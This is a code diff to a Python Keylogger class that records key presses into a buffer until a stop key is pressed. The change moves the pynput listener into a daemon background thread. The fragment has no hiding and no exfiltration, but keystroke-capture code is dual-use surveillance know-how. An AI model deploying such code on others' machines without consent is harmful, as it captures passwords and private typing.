@@ -12,10 +12,10 @@ class Keylogger:
         """
         self.__pressed_keys = []
         self.__buffer = buffer
-        self.__listener = None
         self.__stop_key = key
         self.__stop_lock = threading.Lock()
         self.__keylogger_stopped = threading.Event()
+        self.__listener_thread = None
 
     def __on_key_release(self, key) -> bool:
         """
@@ -55,11 +55,6 @@ class Keylogger:
             if not self.__keylogger_stopped.is_set():
                 self.__buffer.write_to_buffer(["End"])
                 self.__keylogger_stopped.set()
-                try:
-                    self.__listener.stop()
-                    self.__listener = None
-                except Exception:
-                    raise Exception("Error while stopping Keylogger")
 
     def keylogger_running(self) -> bool:
         """
@@ -77,8 +72,13 @@ class Keylogger:
         """
         self.__keylogger_stopped.clear()
         try:
-            self.__listener = keyboard.Listener(on_press=self.__on_key_press, on_release=self.__on_key_release)
-            self.__listener.start()
+            self.__listener_thread = threading.Thread(target=self.__run_listener)
+            self.__listener_thread.daemon = True
+            self.__listener_thread.start()
         except Exception:
             raise Exception("Error while starting Keylogger")
         return
+
+    def __run_listener(self):
+        with keyboard.Listener(on_press=self.__on_key_press, on_release=self.__on_key_release) as listener:
+            self.__keylogger_stopped.wait()
